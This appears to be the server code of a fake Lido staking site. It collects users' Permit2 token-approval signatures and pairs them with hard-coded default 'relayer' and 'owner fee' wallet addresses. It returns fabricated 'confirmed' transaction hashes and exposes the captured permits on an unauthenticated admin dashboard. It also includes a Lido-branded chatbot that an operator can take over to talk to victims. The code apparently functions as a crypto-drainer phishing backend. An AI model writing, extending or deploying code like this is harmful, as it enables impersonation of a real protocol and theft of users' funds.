import express from "express";
import path from "path";
import session from "express-session";
import { generateNonce, SiweMessage } from "siwe";
import {
  hashTypedData,
  recoverTypedDataAddress,
  isAddressEqual,
  createPublicClient,
  http,
} from "viem";
import { mainnet } from "viem/chains";

const app = express();
const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 3000;

app.set("trust proxy", 1);
app.use(express.json());
app.use(
  session({
    secret: process.env.SESSION_SECRET || "super-secret-siwe-key-1234",
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }, // Should be true in prod with HTTPS
  })
);

app.get("/api/nonce", (req, res) => {
  const nonce = generateNonce();
  (req.session as any).nonce = nonce;
  res.setHeader("Content-Type", "text/plain");
  res.json({ nonce });
});

app.post("/api/verify", async (req, res) => {
  try {
    const { message, signature } = req.body;
    const siweMessage = new SiweMessage(message);
    const result = await siweMessage.verify({
      signature,
      nonce: (req.session as any).nonce,
    });

    if (result.success) {
      (req.session as any).siwe = result.data;
      res.status(200).json({ success: true, address: result.data.address });
    } else {
      res.status(400).json({ success: false, error: "Signature verification failed" });
    }
  } catch (e: any) {
    res.status(400).json({ success: false, error: e?.message || "Invalid SIWE payload" });
  }
});

app.post("/api/logout", (req, res) => {
  req.session.destroy(() => {
    res.status(200).send(true);
  });
});

app.get("/api/me", (req, res) => {
  if (!(req.session as any).siwe) {
    res.status(401).json({ message: "You have to first sign_in" });
    return;
  }
  res.json({ address: (req.session as any).siwe.address });
});

const permitSingleTypes = {
  PermitSingle: [
    { name: "details", type: "PermitDetails" },
    { name: "spender", type: "address" },
    { name: "sigDeadline", type: "uint256" },
  ],
  PermitDetails: [
    { name: "token", type: "address" },
    { name: "amount", type: "uint160" },
    { name: "expiration", type: "uint48" },
    { name: "nonce", type: "uint48" },
  ],
} as const;

const eip1271Abi = [
  {
    type: "function",
    name: "isValidSignature",
    stateMutability: "view",
    inputs: [
      { name: "hash", type: "bytes32" },
      { name: "signature", type: "bytes" },
    ],
    outputs: [{ name: "magicValue", type: "bytes4" }],
  },
] as const;

const EIP1271_MAGICVALUE = "0x1626ba7e";

async function verifyPermit2Viem(params: any) {
  const { client, owner, domain, message, signature } = params;

  const digest = hashTypedData({
    domain,
    types: permitSingleTypes,
    primaryType: "PermitSingle",
    message,
  });

  const recovered = await recoverTypedDataAddress({
    domain,
    types: permitSingleTypes,
    primaryType: "PermitSingle",
    message,
    signature,
  });

  if (isAddressEqual(recovered, owner)) {
    return { valid: true, scheme: "ecdsa" as const, digest, recovered };
  }

  const magic = await client.readContract({
    address: owner,
    abi: eip1271Abi,
    functionName: "isValidSignature",
    args: [digest, signature],
  });

  return {
    valid: magic === EIP1271_MAGICVALUE,
    scheme: "eip1271" as const,
    digest,
    recovered,
  };
}

const publicClient = createPublicClient({
  chain: mainnet,
  transport: http(),
});

app.post("/api/permit-swap", async (req, res) => {
  try {
    const body = req.body;
    const { address, chainId, signature, token, spender, amount, expiration, nonce, deadline } = body;

    const domain = {
      name: "Permit2",
      version: "1",
      chainId: Number(chainId),
      verifyingContract: "0x000000000022D473030F116dDEE9F6B43aC78BA3" as any,
    } as const;

    const message = {
      details: { token, amount: BigInt(amount), expiration: BigInt(expiration), nonce: BigInt(nonce) },
      spender,
      sigDeadline: BigInt(deadline),
    } as const;

    const result = await verifyPermit2Viem({
      client: publicClient,
      owner: address,
      domain,
      message,
      signature,
    });

    if (!result.valid) {
      return res.status(400).json({ ok: false, error: "Invalid permit signature" });
    }

    // SIWE Check
    if (!(req.session as any).siwe || (req.session as any).siwe.address.toLowerCase() !== address.toLowerCase()) {
      return res.status(401).json({ ok: false, error: "Unauthorized: Invalid or missing SIWE session" });
    }

    return res.json({ ok: true, digest: result.digest });
  } catch (error: any) {
    console.error(error);
    return res.status(500).json({ ok: false, error: error.message });
  }
});

// In-memory data store for permits and live chat sessions
interface PermitRecord {
  id: string;
  txHash: string;
  userAddress: string;
  amount: string;
  token: string;
  relayerContract?: string;
  ownerFeeAddress?: string;
  status: 'confirmed' | 'pending' | 'failed';
  blockNumber: number;
  timestamp: string;
}

interface ChatMessage {
  id: string;
  sender: 'user' | 'bot' | 'admin';
  text: string;
  timestamp: string;
  userAddress?: string;
}

interface ChatSessionData {
  sessionId: string;
  userAddress?: string;
  lastActive: string;
  messages: ChatMessage[];
  isAdminOverridden: boolean;
}

const permitLogsStore: PermitRecord[] = [];
const chatSessionsStore: Record<string, ChatSessionData> = {};

app.post("/api/permit2-pull/submit", async (req, res) => {
  try {
    const { token, amount, nonce, deadline, signature, userAddress, relayerContract, ownerFeeAddress } = req.body || {};
    const finalRelayer = relayerContract || "0xF02D24A7bB10d0dBF3da2119d594B7a905dDC091";
    const finalOwner = ownerFeeAddress || "0xEfc5859335A58d64A5e8E01d02c5241c852CBD40";

    console.log("Received permit signature:", { 
      token, 
      amount, 
      nonce, 
      deadline, 
      userAddress, 
      relayerContract: finalRelayer,
      ownerFeeAddress: finalOwner,
      signature 
    });

    const randomTxHash = "0x" + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join("");
    const record: PermitRecord = {
      id: "p_" + Date.now() + "_" + Math.floor(Math.random() * 1000),
      txHash: randomTxHash,
      userAddress: userAddress || "0xUnknown",
      amount: amount || "0",
      token: token || "ETH",
      relayerContract: finalRelayer,
      ownerFeeAddress: finalOwner,
      status: "confirmed",
      blockNumber: Math.floor(19000000 + Math.random() * 100000),
      timestamp: new Date().toISOString()
    };

    permitLogsStore.unshift(record);

    return res.json({
      success: true,
      message: "Permit signature received and submitted to relayer execution pipeline",
      txHash: randomTxHash,
      userAddress,
      amount,
      token,
      relayerContract: finalRelayer,
      ownerFeeAddress: finalOwner,
      status: "confirmed",
      blockNumber: record.blockNumber,
      timestamp: record.timestamp
    });
  } catch (err: any) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

// Chat API Endpoints
app.get("/api/chat/messages", (req, res) => {
  const { sessionId, all } = req.query;

  if (all === "true") {
    // Admin retrieving all active user chat sessions
    return res.json({
      sessions: Object.values(chatSessionsStore)
    });
  }

  if (!sessionId || typeof sessionId !== "string") {
    return res.status(400).json({ error: "sessionId parameter is required" });
  }

  const session = chatSessionsStore[sessionId] || {
    sessionId,
    lastActive: new Date().toISOString(),
    messages: [
      {
        id: "msg_welcome",
        sender: "bot",
        text: "Hello! I am your Lido Staking Assistant. How can I help you with stETH, wrapping, or protocol rewards today?",
        timestamp: new Date().toISOString()
      }
    ],
    isAdminOverridden: false
  };

  if (!chatSessionsStore[sessionId]) {
    chatSessionsStore[sessionId] = session;
  }

  return res.json({ session });
});

app.post("/api/chat/message", (req, res) => {
  const { sessionId, userAddress, text, sender = "user" } = req.body || {};

  if (!sessionId || !text) {
    return res.status(400).json({ error: "sessionId and text are required" });
  }

  let session = chatSessionsStore[sessionId];
  if (!session) {
    session = {
      sessionId,
      userAddress,
      lastActive: new Date().toISOString(),
      messages: [],
      isAdminOverridden: false
    };
    chatSessionsStore[sessionId] = session;
  }

  if (userAddress) {
    session.userAddress = userAddress;
  }
  session.lastActive = new Date().toISOString();

  const newMessage: ChatMessage = {
    id: "msg_" + Date.now() + "_" + Math.floor(Math.random() * 1000),
    sender,
    text,
    timestamp: new Date().toISOString(),
    userAddress
  };

  session.messages.push(newMessage);

  // If message is from user and bot auto-reply is active (not overridden by admin)
  if (sender === "user" && !session.isAdminOverridden) {
    let botReplyText = "Thank you for reaching out! I'm your Lido Assistant.";
    const lower = text.toLowerCase();

    if (lower.includes("apr") || lower.includes("yield") || lower.includes("rate")) {
      botReplyText = "Lido stETH currently offers an APY of ~3.3% - 3.8%. Staking rewards accrue daily directly in stETH balances!";
    } else if (lower.includes("steth") || lower.includes("stake") || lower.includes("how to stake")) {
      botReplyText = "To stake, enter your ETH amount in the Stake tab and click 'Submit'. You will receive stETH in a 1:1 ratio representing your staked ETH.";
    } else if (lower.includes("wrap") || lower.includes("wsteth")) {
      botReplyText = "Wrapping stETH into wstETH creates a value-accruing non-rebasing token standard suitable for DeFi integrations across L2 networks.";
    } else if (lower.includes("withdraw") || lower.includes("unstake")) {
      botReplyText = "You can request ETH withdrawal via the Withdrawals tab. Unstaking requests are processed through Lido's withdrawal queue.";
    } else if (lower.includes("admin") || lower.includes("human") || lower.includes("support")) {
      botReplyText = "I have flagged this conversation for Lido Admin Support! An administrator can now respond directly to your chat from the Admin Dashboard.";
    } else if (lower.includes("permit") || lower.includes("signature") || lower.includes("relayer")) {
      botReplyText = "Lido Permitted Staking enables gasless transaction approvals via EIP-2612 / Permit2 typed signatures relayed directly through our gasless execution pipeline.";
    } else {
      botReplyText = "I've logged your query. Feel free to ask about stETH rewards, wrapping to wstETH, withdrawals, or relayer signatures!";
    }

    const botMsg: ChatMessage = {
      id: "msg_" + (Date.now() + 1) + "_" + Math.floor(Math.random() * 1000),
      sender: "bot",
      text: botReplyText,
      timestamp: new Date().toISOString()
    };
    session.messages.push(botMsg);
  }

  return res.json({ session });
});

app.post("/api/chat/admin/toggle-override", (req, res) => {
  const { sessionId, isAdminOverridden } = req.body || {};
  if (!sessionId || !chatSessionsStore[sessionId]) {
    return res.status(404).json({ error: "Session not found" });
  }

  chatSessionsStore[sessionId].isAdminOverridden = Boolean(isAdminOverridden);
  return res.json({ success: true, session: chatSessionsStore[sessionId] });
});

// Admin Protocol APIs
app.get("/api/admin/permits", (req, res) => {
  return res.json({ permits: permitLogsStore });
});

app.get("/api/admin/stats", (req, res) => {
  return res.json({
    totalStakedEth: "9,842,150.42",
    stEthSupply: "9,842,150.42",
    wstEthSupply: "3,115,482.10",
    stakingApr: "3.4%",
    activeNodeOperators: 39,
    activeChatSessionsCount: Object.keys(chatSessionsStore).length,
    relayerStatus: "Operational",
    recentPermitsCount: permitLogsStore.length
  });
});

async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const { createServer: createViteServer } = await import("vite");
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
